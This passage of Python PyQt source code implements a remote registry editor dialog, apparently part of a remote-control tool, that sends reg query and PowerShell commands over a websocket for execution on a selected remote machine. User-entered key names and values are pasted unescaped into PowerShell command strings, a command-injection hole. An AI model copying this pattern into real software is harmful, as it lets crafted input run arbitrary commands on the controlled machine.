        '  gridline-color: #2e3040; font-family: Consolas, monospace; font-size: 8pt; }'
        'QTreeWidget::item { padding: 2px 4px; }'
        'QTreeWidget::item:selected { background: #5865F2; color: #fff; }'
        'QTreeWidget::item:hover { background: #2a2b3d; }'
        'QTreeWidget::branch:has-children:!has-siblings:closed, QTreeWidget::branch:closed:has-children:has-siblings { image: none; }'
        'QTreeWidget::branch:open:has-children:!has-siblings, QTreeWidget::branch:open:has-children:has-siblings { image: none; }'
        'QTableWidget { background: #12131a; color: #d4d4d4; border: 1px solid #2e3040;'
        '  gridline-color: #2e3040; font-family: Consolas, monospace; font-size: 8pt; }'
        'QTableWidget::item { padding: 2px 6px; }'
        'QTableWidget::item:selected { background: #5865F2; color: #fff; }'
        'QHeaderView::section { background: #1a1b24; color: #818cf8; border: 1px solid #2e3040;'
        '  padding: 4px 8px; font-weight: bold; font-size: 8pt; }'
        'QLineEdit { background: #1a1b24; color: #d4d4d4; border: 1px solid #2e3040;'
        '  border-radius: 4px; padding: 4px 8px; font-size: 9pt; }'
        'QPushButton { background: #1a1b24; color: #d4d4d4; border: 1px solid #3a3c4e;'
        '  border-radius: 4px; padding: 6px 14px; font-weight: bold; }'
        'QPushButton:hover { background: #2a2b3d; border-color: #5865F2; }'
        'QLabel { color: #9a9cb0; }'
        'QComboBox { background: #1a1b24; color: #d4d4d4; border: 1px solid #2e3040;'
        '  border-radius: 4px; padding: 4px 8px; font-size: 9pt; }'
        'QTextEdit { background: #12131a; color: #d4d4d4; border: 1px solid #2e3040;'
        '  border-radius: 4px; padding: 4px; font-family: Consolas, monospace; font-size: 8pt; }'
    )

    # Windows Registry root hives
    _ROOT_HIVES = [
        ('HKEY_CLASSES_ROOT', 'HKCR'),
        ('HKEY_CURRENT_USER', 'HKCU'),
        ('HKEY_LOCAL_MACHINE', 'HKLM'),
        ('HKEY_USERS', 'HKU'),
        ('HKEY_CURRENT_CONFIG', 'HKCC'),
    ]

    def __init__(self, main_win):
        # pyre-ignore[19]
        super().__init__(main_win)
        self.main_win = main_win
        self.setWindowTitle('Registry Editor')
        self.resize(1100, 700)
        self.setStyleSheet(self._DARK_STYLE)
        
        self._current_key_path = ''
        self._pending_requests = {}  # requestId -> callback
        self._expanded_keys = set()  # Track expanded keys for lazy loading
        
        self._build_ui()
        self._populate_root_hives()

    def _build_ui(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(8)

        # Title
        title = QLabel('🗂️  Remote Registry Editor')
        title.setStyleSheet('font-size: 14px; font-weight: bold; color: #818cf8; border: none;')
        layout.addWidget(title)

        # Toolbar
        toolbar = QHBoxLayout()
        toolbar.setSpacing(8)

        self.path_input = QLineEdit()
        self.path_input.setPlaceholderText('Registry path (e.g., HKLM\\SOFTWARE\\Microsoft)')
        self.path_input.returnPressed.connect(self._navigate_to_path)
        toolbar.addWidget(self.path_input, 1)

        self.go_btn = QPushButton('Go')
        self.go_btn.setToolTip('Navigate to the specified registry path')
        self.go_btn.clicked.connect(self._navigate_to_path)
        toolbar.addWidget(self.go_btn)

        self.refresh_btn = QPushButton('⟳  Refresh')
        self.refresh_btn.setToolTip('Refresh the current registry key')
        self.refresh_btn.clicked.connect(self._refresh_current_key)
        toolbar.addWidget(self.refresh_btn)

        self.search_btn = QPushButton('🔍  Search')
        self.search_btn.setToolTip('Search for registry keys and values')
        self.search_btn.clicked.connect(self._show_search_dialog)
        toolbar.addWidget(self.search_btn)

        layout.addLayout(toolbar)

        # Main splitter: tree on left, values on right
        splitter = QSplitter(Qt.Horizontal)

        # Left panel: Registry tree
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(0, 0, 0, 0)
        left_layout.setSpacing(4)

        tree_label = QLabel('Registry Keys')
        tree_label.setStyleSheet('font-weight: bold; color: #818cf8; border: none; font-size: 9pt;')
        left_layout.addWidget(tree_label)

        self.tree = QTreeWidget()
        self.tree.setHeaderHidden(True)
        self.tree.setContextMenuPolicy(Qt.CustomContextMenu)
        self.tree.customContextMenuRequested.connect(self._show_tree_context_menu)
        self.tree.itemExpanded.connect(self._on_item_expanded)
        self.tree.itemClicked.connect(self._on_tree_item_clicked)
        # Ensure tree is visible with explicit styling
        self.tree.setStyleSheet(
            'QTreeWidget { background: #12131a; color: #e8e9f5; border: 1px solid #2e3040; }'
            'QTreeWidget::item { color: #e8e9f5; padding: 4px; }'
            'QTreeWidget::item:selected { background: #5865F2; color: #fff; }'
            'QTreeWidget::item:hover { background: #2a2b3d; }'
        )
        self.tree.setMinimumWidth(200)
        left_layout.addWidget(self.tree)

        # Right panel: Values table
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(0, 0, 0, 0)
        right_layout.setSpacing(4)

        values_label = QLabel('Registry Values')
        values_label.setStyleSheet('font-weight: bold; color: #818cf8; border: none; font-size: 9pt;')
        right_layout.addWidget(values_label)

        self.values_table = QTableWidget()
        self.values_table.setColumnCount(3)
        self.values_table.setHorizontalHeaderLabels(['Name', 'Type', 'Data'])
        self.values_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.values_table.setSelectionMode(QAbstractItemView.ExtendedSelection)
        self.values_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.values_table.setSortingEnabled(False)
        self.values_table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.values_table.customContextMenuRequested.connect(self._show_value_context_menu)
        self.values_table.itemDoubleClicked.connect(self._edit_value)
        
        header = self.values_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.Interactive)
        header.setSectionResizeMode(1, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.Stretch)
        self.values_table.setColumnWidth(0, 200)
        self.values_table.verticalHeader().setVisible(False)
        self.values_table.verticalHeader().setDefaultSectionSize(22)
        
        right_layout.addWidget(self.values_table)

        splitter.addWidget(left_panel)
        splitter.addWidget(right_panel)
        splitter.setSizes([350, 750])
        layout.addWidget(splitter, 1)

        # Status bar
        self.status_label = QLabel('Ready. Select a registry key to view its values.')
        self.status_label.setStyleSheet('color: #686a80; font-size: 8pt; border: none; padding: 4px;')
        layout.addWidget(self.status_label)

        # Bottom buttons
        button_layout = QHBoxLayout()
        
        # Add a test button for debugging
        test_btn = QPushButton('🧪 Test Table')
        test_btn.setStyleSheet('''
            QPushButton {
                background: #818cf8;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 6px;
                font-weight: bold;
                font-size: 9pt;
            }
            QPushButton:hover {
                background: #6366f1;
            }
            QPushButton:pressed {
                background: #4f46e5;
            }
        ''')
        test_btn.clicked.connect(self._test_table)
        button_layout.addWidget(test_btn)
        
        export_btn = QPushButton('📤 Export')
        export_btn.setToolTip('Export selected key to .reg file')
        export_btn.clicked.connect(self._export_key)
        button_layout.addWidget(export_btn)

        import_btn = QPushButton('📥 Import')
        import_btn.setToolTip('Import .reg file to remote registry')
        import_btn.clicked.connect(self._import_reg_file)
        button_layout.addWidget(import_btn)

        close_btn = QPushButton('✖ Close')
        close_btn.clicked.connect(self.close)
        button_layout.addWidget(close_btn)
        
        layout.addLayout(button_layout)
        self.setLayout(layout)

    def _populate_root_hives(self):
        """Populate the tree with root registry hives."""
        print('[DEBUG] Populating root registry hives...')
        print(f'[DEBUG] Tree widget visible: {self.tree.isVisible()}')
        print(f'[DEBUG] Tree widget size: {self.tree.size()}')
        self.tree.clear()
        for full_name, short_name in self._ROOT_HIVES:
            print(f'[DEBUG] Adding hive: {full_name}')
            item = QTreeWidgetItem([full_name])
            item.setData(0, Qt.UserRole, full_name)  # Store full path
            item.setData(0, Qt.UserRole + 1, True)   # Mark as hive root
            # Explicitly set text color to ensure visibility
            item.setForeground(0, QColor('#e8e9f5'))
            # Add dummy child to make it expandable
            dummy = QTreeWidgetItem(['Loading...'])
            dummy.setForeground(0, QColor('#686a80'))
            item.addChild(dummy)
            self.tree.addTopLevelItem(item)
            print(f'[DEBUG]   Item text: {item.text(0)}, visible: {not item.isHidden()}')
        print(f'[DEBUG] Added {self.tree.topLevelItemCount()} root items to tree')
        # Force tree to update
        self.tree.update()
        self.tree.repaint()

    def _on_tree_item_clicked(self, item, column):
        """When a tree item is clicked, load its values."""
        key_path = item.data(0, Qt.UserRole)
        print(f"[DEBUG] Tree item clicked: key_path={key_path}")
        
        if not key_path or key_path == 'Loading...':
            print(f"[DEBUG] Skipping click - no key_path or loading")
            return
        
        print(f"[DEBUG] Loading values for clicked key: {key_path}")
        self._current_key_path = key_path
        self.path_input.setText(key_path)
        self._load_values(key_path)

    def _on_item_expanded(self, item):
        """Lazy load subkeys when a tree item is expanded."""
        key_path = item.data(0, Qt.UserRole)
        if not key_path:
            return
        
        # Check if already loaded (has real children, not dummy)
        if item.childCount() == 1:
            first_child = item.child(0)
            if first_child.text(0) == 'Loading...':
                # Remove dummy and load real subkeys
                item.removeChild(first_child)
                self._load_subkeys(key_path, item)

    def _load_subkeys(self, key_path, parent_item):
        """Request subkeys for a given registry path."""
        if not self.main_win.selected_sender:
            self.status_label.setText('⚠ No sender selected.')
            return
        
        req_id = 'reg-subkeys-' + str(uuid.uuid4())
        self._pending_requests[req_id] = lambda data: self._handle_subkeys_response(data, parent_item, key_path)
        
        # Use reg query to list subkeys
        cmd = f'reg query "{key_path}"'
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.main_win.selected_sender,
            'command': cmd,
            'requestId': req_id,
        }))

    def _handle_subkeys_response(self, data, parent_item, key_path):
        """Handle the response containing subkeys from reg query command."""
        output = data.get('output', '')
        
        # Clear any existing children
        while parent_item.childCount() > 0:
            parent_item.removeChild(parent_item.child(0))
        
        # Parse reg query output to extract subkeys
        # Output format: lines starting with "HKEY_" are subkeys
        subkeys = []
        for line in output.split('\n'):
            line = line.strip()
            if line.startswith('HKEY_') or line.startswith('HK'):
                # Extract just the last part of the path (subkey name)
                if '\\' in line:
                    subkey_name = line.split('\\')[-1]
                    if subkey_name and subkey_name != key_path.split('\\')[-1]:
                        subkeys.append(line)  # Store full path
        
        if not subkeys:
            # No subkeys - add a placeholder
            no_keys = QTreeWidgetItem(['(no subkeys)'])
            no_keys.setForeground(0, QColor('#686a80'))
            parent_item.addChild(no_keys)
            return
        
        # Add subkeys
        for full_path in subkeys:
            subkey_name = full_path.split('\\')[-1]
            item = QTreeWidgetItem([subkey_name])
            item.setData(0, Qt.UserRole, full_path)
            item.setForeground(0, QColor('#e8e9f5'))
            # Add dummy child to make it expandable
            dummy = QTreeWidgetItem(['Loading...'])
            dummy.setForeground(0, QColor('#686a80'))
            item.addChild(dummy)
            parent_item.addChild(item)

    def _load_values(self, key_path):
        """Request values for a given registry key."""
        print(f"[DEBUG] Loading values for key: {key_path}")
        
        # First, test if the table is working by adding a direct test row
        print(f"[DEBUG] Testing table widget directly...")
        try:
            self.values_table.setRowCount(1)
            self.values_table.setColumnCount(3)
            test_item = QTableWidgetItem("Direct Test")
            self.values_table.setItem(0, 0, test_item)
            self.values_table.setItem(0, 1, QTableWidgetItem("REG_SZ"))
            self.values_table.setItem(0, 2, QTableWidgetItem("Test Data"))
            self.values_table.repaint()
            print(f"[DEBUG] Direct test row added to table")
            print(f"[DEBUG] Table row count after direct test: {self.values_table.rowCount()}")
            print(f"[DEBUG] Table column count after direct test: {self.values_table.columnCount()}")
        except Exception as e:
            print(f"[DEBUG] Error adding direct test row: {e}")
        
        if not self.main_win.selected_sender:
            self.status_label.setText('⚠ No sender selected.')
            return
        
        req_id = 'reg-values-' + str(uuid.uuid4())
        print(f"[DEBUG] Created request ID: {req_id}")
        self._pending_requests[req_id] = lambda data: self._handle_values_response(data, key_path)
        print(f"[DEBUG] Added callback for {req_id}")
        
        self.status_label.setText(f'⏳ Loading values for {key_path}...')
        
        # Use reg query to list values for current key only (no /s for subkeys)
        cmd = f'reg query "{key_path}"'
        print(f"[DEBUG] Sending command: {cmd}")
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.main_win.selected_sender,
            'command': cmd,
            'requestId': req_id,
        }))
        print(f"[DEBUG] Command sent for {req_id}")

    def _handle_values_response(self, data, key_path):
        """Handle the response containing registry values from reg query command."""
        output = data.get('output', '')
        exit_code = data.get('exitCode', 0)
        
        # Debug information
        print(f"[DEBUG] Values response: exitCode={exit_code}")
        print(f"[DEBUG] Values output: {output[:500]}...")
        
        # Clear the table first
        self.values_table.setSortingEnabled(False)
        self.values_table.setRowCount(0)
        
        if exit_code != 0:
            self.status_label.setText(f'❌ Failed to load values: Registry key not found or access denied')
            return
        
        # Parse reg query output to extract values
        # The format shows the key path first, then values with 4 spaces indentation
        values = []
        lines = output.split('\n')
        
        print(f"[DEBUG] Parsing {len(lines)} lines of output for key: {key_path}")
        
        # Find the key header line first
        found_key_header = False
        
        for i, line in enumerate(lines):
            original_line = line
            line = line.strip()
            
            # Skip empty lines
            if not line:
                print(f"[DEBUG] Line {i}: Empty line, skipping")
                continue
            
            print(f"[DEBUG] Line {i}: '{line}'")
            
            # Check if this is the key header we're looking for
            if line.upper() == key_path.upper():
                print(f"[DEBUG] Found key header: {line}")
                found_key_header = True
                continue
            
            # Skip other key headers (subkeys)
            if line.startswith('HKEY_'):
                print(f"[DEBUG] Skipping other key header: {line}")
                found_key_header = False
                continue
            
            # Parse value lines - they come after our key header and are indented
            if found_key_header and original_line.startswith('    '):
                print(f"[DEBUG] Parsing value line: '{original_line}'")
                # Remove leading spaces and parse
                line_parts = line.strip().split(None, 2)  # Split into max 3 parts
                print(f"[DEBUG] Split into {len(line_parts)} parts: {line_parts}")
                
                if len(line_parts) >= 2:
                    name = line_parts[0]
                    val_type = line_parts[1] if len(line_parts) > 1 else 'REG_SZ'
                    val_data = line_parts[2] if len(line_parts) > 2 else ''
                    
                    # Handle (Default) value - it might appear as <NO NAME>
                    if name == '<NO NAME>':
                        name = '(Default)'
                    
                    print(f"[DEBUG] Parsed value: name='{name}', type='{val_type}', data='{val_data}'")
                    
                    values.append({
                        'name': name,
                        'type': val_type,
                        'data': val_data
                    })
                else:
                    print(f"[DEBUG] Not enough parts in value line, skipping")
            else:
                if found_key_header:
                    print(f"[DEBUG] Line doesn't start with spaces, not a value line")
                else:
                    print(f"[DEBUG] Haven't found key header yet, skipping line")
        
        # Fallback: If we didn't find the key header, try a simpler approach
        # Just look for any line with REG_ in it that's indented
        if not values and not found_key_header:
            print(f"[DEBUG] No values found with key header method, trying fallback...")
            for i, line in enumerate(lines):
                if 'REG_' in line and line.startswith('    '):
                    print(f"[DEBUG] Fallback parsing line {i}: '{line}'")
                    # Use a more sophisticated parsing to handle names with spaces
                    clean_line = line.strip()
                    if 'REG_' in clean_line:
                        # Find the REG_ type first
                        reg_pos = clean_line.find('REG_')
                        if reg_pos > 0:
                            # Extract everything before REG_ as the name
                            name = clean_line[:reg_pos].strip()
                            # Extract the REG_ type and data
                            remaining = clean_line[reg_pos:].strip()
                            parts = remaining.split(None, 1)
                            val_type = parts[0] if len(parts) > 0 else 'REG_SZ'
                            val_data = parts[1] if len(parts) > 1 else ''
                        else:
                            # Fallback to simple split
                            line_parts = clean_line.split(None, 2)
                            name = line_parts[0] if len(line_parts) > 0 else ''
                            val_type = line_parts[1] if len(line_parts) > 1 else 'REG_SZ'
                            val_data = line_parts[2] if len(line_parts) > 2 else ''
                    else:
                        # Fallback to simple split
                        line_parts = clean_line.split(None, 2)
                        name = line_parts[0] if len(line_parts) > 0 else ''
                        val_type = line_parts[1] if len(line_parts) > 1 else 'REG_SZ'
                        val_data = line_parts[2] if len(line_parts) > 2 else ''
                    
                    if name == '<NO NAME>':
                        name = '(Default)'
                    
                    print(f"[DEBUG] Fallback parsed: name='{name}', type='{val_type}', data='{val_data}'")
                    values.append({
                        'name': name,
                        'type': val_type,
                        'data': val_data
                    })
        
        print(f"[DEBUG] Parsed {len(values)} values")
        for i, val in enumerate(values):
            print(f"[DEBUG]   Value {i}: {val}")
        
        # Populate the table
        self.values_table.setRowCount(len(values))
        self.values_table.clearContents()  # Clear existing content
        
        print(f"[DEBUG] Setting table row count to {len(values)}")
        
        for i, val in enumerate(values):
            name = val.get('name', '(Default)')
            val_type = val.get('type', 'REG_NONE')
            val_data = val.get('data', '')
            
            print(f"[DEBUG] Adding row {i}: {name}, {val_type}, {val_data}")
            
            name_item = QTableWidgetItem(name)
            type_item = QTableWidgetItem(val_type)
            data_item = QTableWidgetItem(val_data)
            
            # Store the full value info for editing
            name_item.setData(Qt.UserRole, val)
            
            self.values_table.setItem(i, 0, name_item)
            self.values_table.setItem(i, 1, type_item)
            self.values_table.setItem(i, 2, data_item)
        
        # Re-enable sorting
        self.values_table.setSortingEnabled(True)
        
        # Force multiple UI updates
        self.values_table.reset()
        self.values_table.viewport().update()
        self.values_table.update()
        self.values_table.repaint()
        self.values_table.resizeColumnsToContents()
        self.values_table.resizeRowsToContents()
        
        # Update status
        if values:
            self.status_label.setText(f'✅ Loaded {len(values)} values for {key_path}')
        else:
            self.status_label.setText(f'✅ No values found in {key_path}')
        
        # Update current key path
        self._current_key_path = key_path
        
        print(f"[DEBUG] Table updated with {len(values)} rows")
        print(f"[DEBUG] Table row count: {self.values_table.rowCount()}")
        print(f"[DEBUG] Table column count: {self.values_table.columnCount()}")
        
        # Test: Add a sample row if no values were found to verify table is working
        if len(values) == 0:
            print(f"[DEBUG] No values found, adding test row to verify table works")
            test_item = QTableWidgetItem("Test Value")
            test_item.setData(Qt.UserRole, {'name': 'Test Value', 'type': 'REG_SZ', 'data': 'Test Data'})
            self.values_table.setItem(0, 0, test_item)
            self.values_table.setItem(0, 1, QTableWidgetItem("REG_SZ"))
            self.values_table.setItem(0, 2, QTableWidgetItem("Test Data"))
            self.values_table.setRowCount(1)
            self.status_label.setText(f"🧪 Test row added - table is working")

    def _test_table(self):
        """Manually test the table widget to ensure it's working."""
        print(f"[DEBUG] Manual table test started")
        try:
            # Clear the table
            self.values_table.setRowCount(0)
            self.values_table.clearContents()
            
            # First test with known registry key that has values
            print(f"[DEBUG] Testing with known registry key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion")
            test_key = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"
            
            # Add test data
            test_data = [
                ("Test Name 1", "REG_SZ", "Test Data 1"),
                ("Test Name 2", "REG_DWORD", "0x12345678"),
                ("Test Name 3", "REG_BINARY", "01 02 03 04"),
            ]
            
            self.values_table.setRowCount(len(test_data))
            
            for i, (name, type_val, data) in enumerate(test_data):
                print(f"[DEBUG] Adding test row {i}: {name}, {type_val}, {data}")
                
                name_item = QTableWidgetItem(name)
                type_item = QTableWidgetItem(type_val)
                data_item = QTableWidgetItem(data)
                
                self.values_table.setItem(i, 0, name_item)
                self.values_table.setItem(i, 1, type_item)
                self.values_table.setItem(i, 2, data_item)
            
            # Force UI updates
            self.values_table.viewport().update()
            self.values_table.update()
            self.values_table.repaint()
            self.values_table.resizeColumnsToContents()
            
            self.status_label.setText(f"🧪 Manual test: Added {len(test_data)} test rows")
            print(f"[DEBUG] Manual test completed: {len(test_data)} rows added")
            print(f"[DEBUG] Table row count: {self.values_table.rowCount()}")
            
            # Now test with the actual registry key that definitely has values
            print(f"[DEBUG] Testing actual registry key: {test_key}")
            self._load_values(test_key)
            
        except Exception as e:
            print(f"[DEBUG] Error in manual table test: {e}")
            self.status_label.setText(f"❌ Table test failed: {e}")

    def _navigate_to_path(self):
        """Navigate to the path entered in the path input."""
        path = self.path_input.text().strip()
        if not path:
            return
        
        # Expand tree to this path and load values
        self._current_key_path = path
        self._load_values(path)
        # TODO: Expand tree to show this path

    def _refresh_current_key(self):
        """Refresh the currently selected key."""
        if self._current_key_path:
            self._load_values(self._current_key_path)

    def _show_tree_context_menu(self, pos):
        """Show context menu for registry keys."""
        item = self.tree.itemAt(pos)
        if not item:
            return
        
        key_path = item.data(0, Qt.UserRole)
        if not key_path or key_path == 'Loading...':
            return
        
        menu = QMenu(self)
        
        new_key_act = menu.addAction('➕  New Key')
        new_value_act = menu.addAction('📝  New Value')
        menu.addSeparator()
        delete_key_act = menu.addAction('🗑️  Delete Key')
        menu.addSeparator()
        export_act = menu.addAction('📤  Export Key')
        copy_path_act = menu.addAction('📋  Copy Path')
        
        action = menu.exec_(self.tree.viewport().mapToGlobal(pos))
        
        if action == new_key_act:
            self._create_new_key(key_path)
        elif action == new_value_act:
            self._create_new_value(key_path)
        elif action == delete_key_act:
            self._delete_key(key_path, item)
        elif action == export_act:
            self._export_key_to_file(key_path)
        elif action == copy_path_act:
            QApplication.clipboard().setText(key_path)
            self.status_label.setText(f'Copied: {key_path}')

    def _show_value_context_menu(self, pos):
        """Show context menu for registry values."""
        item = self.values_table.itemAt(pos)
        if not item:
            return
        
        row = item.row()
        name_item = self.values_table.item(row, 0)
        value_info = name_item.data(Qt.UserRole)
        
        menu = QMenu(self)
        
        modify_act = menu.addAction('✏️  Modify')
        menu.addSeparator()
        delete_act = menu.addAction('🗑️  Delete')
        menu.addSeparator()
        copy_name_act = menu.addAction('📋  Copy Name')
        copy_data_act = menu.addAction('📋  Copy Data')
        
        action = menu.exec_(self.values_table.viewport().mapToGlobal(pos))
        
        if action == modify_act:
            self._edit_value(name_item)
        elif action == delete_act:
            self._delete_value(value_info)
        elif action == copy_name_act:
            QApplication.clipboard().setText(value_info.get('name', ''))
        elif action == copy_data_act:
            QApplication.clipboard().setText(str(value_info.get('data', '')))

    def _create_new_key(self, parent_path):
        """Create a new registry key."""
        name, ok = QInputDialog.getText(self, 'New Key', 'Enter key name:')
        if not ok or not name.strip():
            return
        
        name = name.strip()
        new_path = f"{parent_path}\\{name}"
        
        if not self.main_win.selected_sender:
            self.status_label.setText('⚠ No sender selected.')
            return
        
        # Use PowerShell for more reliable key creation
        command = f'powershell -Command "try {{ New-Item -Path \"Registry::{parent_path}\" -Name \"{name}\" -Force; Write-Output \"SUCCESS:Key created\" }} catch {{ Write-Output \"ERROR:$($_.Exception.Message)\" }}"'
        
        req_id = 'reg-create-key-' + str(uuid.uuid4())
        self._pending_requests[req_id] = lambda data: self._handle_create_key_response(data, parent_path)
        
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.main_win.selected_sender,
            'command': command,
            'requestId': req_id,
        }))
        
        self.status_label.setText(f'⏳ Creating key: {new_path}...')

    def _handle_create_key_response(self, data, parent_path):
        """Handle response from creating a new key."""
        output = data.get('output', '').strip()
        
        if output.startswith('SUCCESS:'):
            self.status_label.setText('✅ Key created successfully.')
            self._refresh_current_key()
        else:
            error_msg = output.replace('ERROR:', '') if output.startswith('ERROR:') else 'Unknown error'
            
            # Provide more user-friendly error messages
            if 'Access is denied' in error_msg or 'Cannot write' in error_msg:
                error_msg = 'Access denied: You do not have permission to create registry keys. Try running as Administrator.'
            elif 'already exists' in error_msg:
                error_msg = 'Registry key already exists.'
            
            self.status_label.setText(f'❌ Failed to create key: {error_msg}')

    def _create_new_value(self, key_path):
        """Create a new registry value."""
        dialog = QDialog(self)
        dialog.setWindowTitle('New Value')
        dialog.setFixedSize(400, 200)
        dialog.setStyleSheet(self._DARK_STYLE)
        
        layout = QVBoxLayout()
        
        # Value name
        layout.addWidget(QLabel('Value name:'))
        name_input = QLineEdit()
        layout.addWidget(name_input)
        
        # Value type
        layout.addWidget(QLabel('Value type:'))
        type_combo = QComboBox()
        type_combo.addItems(['REG_SZ', 'REG_DWORD', 'REG_QWORD', 'REG_BINARY', 'REG_MULTI_SZ', 'REG_EXPAND_SZ'])
        layout.addWidget(type_combo)
        
        # Value data
        layout.addWidget(QLabel('Value data:'))
        data_input = QLineEdit()
        layout.addWidget(data_input)
        
        # Buttons
        btn_layout = QHBoxLayout()
        ok_btn = QPushButton('Create')
        cancel_btn = QPushButton('Cancel')
        ok_btn.clicked.connect(dialog.accept)
        cancel_btn.clicked.connect(dialog.reject)
        btn_layout.addWidget(ok_btn)
        btn_layout.addWidget(cancel_btn)
        layout.addLayout(btn_layout)
        
        dialog.setLayout(layout)
        
        if dialog.exec_() != QDialog.Accepted:
            return
        
        name = name_input.text().strip()
        val_type = type_combo.currentText()
        val_data = data_input.text().strip()
        
        if not name:
            self.status_label.setText('⚠ Value name cannot be empty.')
            return
        
        self._send_set_value(key_path, name, val_type, val_data)

    def _edit_value(self, item):
        """Edit an existing registry value."""
        if not item:
            return
        
        row = item.row()
        name_item = self.values_table.item(row, 0)
        value_info = name_item.data(Qt.UserRole)
        
        name = value_info.get('name', '')
        val_type = value_info.get('type', 'REG_SZ')
        val_data = value_info.get('data', '')
        
        dialog = QDialog(self)
        dialog.setWindowTitle(f'Edit Value: {name}')
        dialog.setFixedSize(500, 300)
        dialog.setStyleSheet(self._DARK_STYLE)
        
        layout = QVBoxLayout()
        
        # Value name (read-only)
        layout.addWidget(QLabel('Value name:'))
        name_label = QLabel(name)
        name_label.setStyleSheet('color: #818cf8; font-weight: bold; border: none;')
        layout.addWidget(name_label)
        
        # Value type
        layout.addWidget(QLabel('Value type:'))
        type_label = QLabel(val_type)
        type_label.setStyleSheet('color: #9a9cb0; border: none;')
        layout.addWidget(type_label)
        
        # Value data
        layout.addWidget(QLabel('Value data:'))
        if val_type == 'REG_MULTI_SZ':
            data_input = QTextEdit()
            if isinstance(val_data, list):
                data_input.setPlainText('\n'.join(val_data))
            else:
                data_input.setPlainText(str(val_data))
        else:
            data_input = QLineEdit()
            data_input.setText(str(val_data))
        layout.addWidget(data_input)
        
        # Buttons
        btn_layout = QHBoxLayout()
        ok_btn = QPushButton('Save')
        cancel_btn = QPushButton('Cancel')
        ok_btn.clicked.connect(dialog.accept)
        cancel_btn.clicked.connect(dialog.reject)
        btn_layout.addWidget(ok_btn)
        btn_layout.addWidget(cancel_btn)
        layout.addLayout(btn_layout)
        
        dialog.setLayout(layout)
        
        if dialog.exec_() != QDialog.Accepted:
            return
        
        if val_type == 'REG_MULTI_SZ':
            new_data = data_input.toPlainText()
        else:
            new_data = data_input.text().strip()
        
        self._send_set_value(self._current_key_path, name, val_type, new_data)

    def _send_set_value(self, key_path, name, val_type, val_data):
        """Send request to set a registry value."""
        if not self.main_win.selected_sender:
            self.status_label.setText('⚠ No sender selected.')
            return
        
        # Use PowerShell for more reliable value setting
        if val_type == 'REG_SZ':
            command = f'powershell -Command "try {{ Set-ItemProperty -Path \"Registry::{key_path}\" -Name \"{name}\" -Value \"{val_data}\" -Force; Write-Output \"SUCCESS:Value set\" }} catch {{ Write-Output \"ERROR:$($_.Exception.Message)\" }}"'
        elif val_type == 'REG_DWORD':
            command = f'powershell -Command "try {{ Set-ItemProperty -Path \"Registry::{key_path}\" -Name \"{name}\" -Value {val_data} -Type DWord -Force; Write-Output \"SUCCESS:Value set\" }} catch {{ Write-Output \"ERROR:$($_.Exception.Message)\" }}"'
        elif val_type == 'REG_QWORD':
            command = f'powershell -Command "try {{ Set-ItemProperty -Path \"Registry::{key_path}\" -Name \"{name}\" -Value {val_data} -Type QWord -Force; Write-Output \"SUCCESS:Value set\" }} catch {{ Write-Output \"ERROR:$($_.Exception.Message)\" }}"'
        elif val_type == 'REG_BINARY':
            # Convert hex string to byte array
            hex_data = val_data.replace(' ', '').replace('-', '')
            command = f'powershell -Command "try {{ $bytes = [System.Convert]::FromHexString(\"{hex_data}\"); Set-ItemProperty -Path \"Registry::{key_path}\" -Name \"{name}\" -Value $bytes -Type Binary -Force; Write-Output \"SUCCESS:Value set\" }} catch {{ Write-Output \"ERROR:$($_.Exception.Message)\" }}"'
        elif val_type == 'REG_MULTI_SZ':
            # Handle multi-string values
            escaped_data = val_data.replace('\n', '`n').replace('"', '`"')
            command = f'powershell -Command "try {{ $values = @(\"{escaped_data}\"); Set-ItemProperty -Path \"Registry::{key_path}\" -Name \"{name}\" -Value $values -Type MultiString -Force; Write-Output \"SUCCESS:Value set\" }} catch {{ Write-Output \"ERROR:$($_.Exception.Message)\" }}"'
        elif val_type == 'REG_EXPAND_SZ':
            command = f'powershell -Command "try {{ Set-ItemProperty -Path \"Registry::{key_path}\" -Name \"{name}\" -Value \"{val_data}\" -Type ExpandString -Force; Write-Output \"SUCCESS:Value set\" }} catch {{ Write-Output \"ERROR:$($_.Exception.Message)\" }}"'
        else:
            command = f'powershell -Command "try {{ Set-ItemProperty -Path \"Registry::{key_path}\" -Name \"{name}\" -Value \"{val_data}\" -Force; Write-Output \"SUCCESS:Value set\" }} catch {{ Write-Output \"ERROR:$($_.Exception.Message)\" }}"'
        
        req_id = 'reg-set-value-' + str(uuid.uuid4())
        self._pending_requests[req_id] = self._handle_set_value_response
        
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.main_win.selected_sender,
            'command': command,
            'requestId': req_id,
        }))
        
        self.status_label.setText(f'⏳ Setting value: {name}...')

    def _handle_set_value_response(self, data):
        """Handle response from setting a value."""
        output = data.get('output', '').strip()
        
        if output.startswith('SUCCESS:'):
            self.status_label.setText('✅ Value saved successfully.')
            self._refresh_current_key()
        else:
            error_msg = output.replace('ERROR:', '') if output.startswith('ERROR:') else 'Unknown error'
            
            # Provide more user-friendly error messages
            if 'Access is denied' in error_msg or 'Cannot write' in error_msg:
                error_msg = 'Access denied: You do not have permission to modify registry values. Try running as Administrator.'
            elif 'does not exist' in error_msg:
                error_msg = 'Registry key does not exist.'
            elif 'Invalid hex' in error_msg or 'FormatException' in error_msg:
                error_msg = 'Invalid hex format for REG_BINARY value.'
            
            self.status_label.setText(f'❌ Failed to save value: {error_msg}')

    def _delete_key(self, key_path, item):
        """Delete a registry key."""
        reply = QMessageBox.question(
